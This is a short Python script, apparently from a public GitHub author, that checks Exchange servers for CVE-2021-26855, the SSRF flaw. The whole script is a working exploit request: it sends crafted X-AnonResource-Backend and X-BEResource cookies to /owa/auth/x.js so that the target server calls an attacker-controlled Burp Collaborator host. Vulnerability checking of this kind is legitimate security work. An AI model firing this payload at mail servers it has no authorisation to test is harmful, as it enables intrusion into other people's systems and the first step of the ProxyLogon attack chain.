#!/usr/bin/python3
# CVE-2021-26855: Exchange Server SSRF Vulnerability
import requests
import argparse
import warnings; warnings.filterwarnings('ignore', message='Unverified HTTPS request')

parser = argparse.ArgumentParser(description="[*] Checker for CVE-2021-26855: Exchange Server SSRF Vulnerability")
parser.add_argument('-u', required=False, default=None, help='URL of the target site.')
parser.add_argument('-c', required=False, default=None, help='Collabrator client.')
args = vars(parser.parse_args())
url = args['u']
collabrator = args['c']

print('# Checker for CVE-2021-26855: Exchange Server SSRF Vulnerability\n# Coded by Abdullah AlZahrani https://Github.com/0xAbdullah')

if(url == None or collabrator == None):
    exit('\n[!] Usage: python3 CVE-2021-26855.py -u https://mail.example.com -c example.burpcollaborator.net')
else:
    print('[*] You set target to {}'.format(url))
    host = url.split("//")[-1].split("/")[0].split('?')[0]

cookies = {
    'X-AnonResource': 'true',
    'X-AnonResource-Backend': '{}/ecp/default.flt?~3'.format(collabrator),
    'X-BEResource': 'localhost/owa/auth/logon.aspx?~3'
}

headers = {
    'Host': '{}'.format(host),
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 pp9520',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close'
}

response = requests.get('{}/owa/auth/x.js'.format(url), headers=headers, cookies=cookies, verify=False)

try:
    if(collabrator in response.headers or response.status_code==500):
        print('[#] This site is vulnerable to CVE-2021-26855\n[!] Check your collabrator client.')
except:
    print('[*] It seems not vulnerable, but check your collabrator client!')
